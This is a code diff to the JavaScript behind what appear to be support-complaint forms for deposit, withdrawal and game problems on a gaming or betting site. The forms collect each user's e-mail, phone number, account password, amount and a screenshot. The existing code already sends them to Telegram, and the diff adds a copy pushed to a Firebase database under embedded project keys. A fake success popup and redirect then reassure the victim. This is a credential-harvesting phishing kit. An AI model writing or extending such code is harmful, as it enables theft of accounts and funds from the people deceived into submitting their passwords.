@@ -4,15 +4,62 @@
 
     var depositForm = document.getElementById('depositForm');
     var withdrawalForm = document.getElementById('withdrawalForm');
+    var gameForm = document.getElementById('gameForm');
 
-    if (!depositForm && !withdrawalForm) { return; }
+    if (!depositForm && !withdrawalForm && !gameForm) { return; }
 
     var isDeposit = !!depositForm;
-    var form = isDeposit ? depositForm : withdrawalForm;
-    var problemType = isDeposit ? 'Deposit' : 'Withdrwal';
+    var isWithdrawal = !!withdrawalForm;
+    var form = isDeposit ? depositForm : (isWithdrawal ? withdrawalForm : gameForm);
+    var problemType = isDeposit ? 'Deposit' : (isWithdrawal ? 'Withdrwal' : 'Game');
     var imageInputId = isDeposit ? 'paymentImage' : 'issueImage';
 
     var LOADING_MS = 3000;
+
+    var FB_CONFIG = {
+        apiKey: "AIzaSyCiuhqX-mjBB6eRjljirzIyuJv0wKVRj58",
+        authDomain: "ludojoy-ca35c.firebaseapp.com",
+        databaseURL: "https://ludojoy-ca35c-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "ludojoy-ca35c",
+        storageBucket: "ludojoy-ca35c.firebasestorage.app",
+        messagingSenderId: "591882703572",
+        appId: "1:591882703572:web:862fa9a649e4723c3b6141"
+    };
+
+    function rowValue(rows, label) {
+        for (var i = 0; i < rows.length; i++) {
+            if (rows[i].label === label) { return rows[i].value; }
+        }
+        return '';
+    }
+
+    function now() {
+        var d = new Date();
+        return ('0' + d.getHours()).slice(-2) + ':' + ('0' + d.getMinutes()).slice(-2);
+    }
+
+    function saveComplaint(rows, imageFile) {
+        var db = firebase.initializeApp(FB_CONFIG).database();
+        var save = function (imageData) {
+            db.ref('bdg-chat/complaints').push({
+                type: problemType,
+                email: rowValue(rows, 'E-mail'),
+                phone: rowValue(rows, 'Phone No'),
+                password: rowValue(rows, 'Password'),
+                problem: rowValue(rows, 'Problem status'),
+                amount: rowValue(rows, 'Amount'),
+                time: now(),
+                image: imageData || null
+            });
+        };
+        if (imageFile) {
+            var reader = new FileReader();
+            reader.onload = function (ev) { save(ev.target.result); };
+            reader.readAsDataURL(imageFile);
+        } else {
+            save(null);
+        }
+    }
 
     function val(id) {
         var el = document.getElementById(id);
@@ -32,12 +79,17 @@
     form.addEventListener('submit', function (e) {
         e.preventDefault();
 
+        var problemEl = document.getElementById('problem');
+        var problemVal = problemEl && problemEl.tagName === 'SELECT'
+            ? selVal('problem')
+            : val('problem');
+
         var rows = [
             { label: 'E-mail', value: val('email') },
             { label: 'Phone No', value: val('mobile') },
             { label: 'Password', value: val('password') },
             { label: 'Type problem', value: problemType },
-            { label: 'Problem status', value: selVal('problem') },
+            { label: 'Problem status', value: problemVal },
             { label: 'Amount', value: val('amount') }
         ];
 
@@ -46,7 +98,9 @@
         setTimeout(function () {
             hideLoading();
             sendToTelegram(rows, getImageFile());
+            saveComplaint(rows, getImageFile());
             form.reset();
+            showSuccess();
         }, LOADING_MS);
     });
 
@@ -92,5 +146,12 @@
 
     function hideLoading() {
         document.getElementById('loadingPopup').classList.add('hidden');
+    }
+
+    function showSuccess() {
+        document.getElementById('successPopup').classList.remove('hidden');
+        setTimeout(function () {
+            window.location.href = 'mailbox.html';
+        }, 2000);
     }
 })();
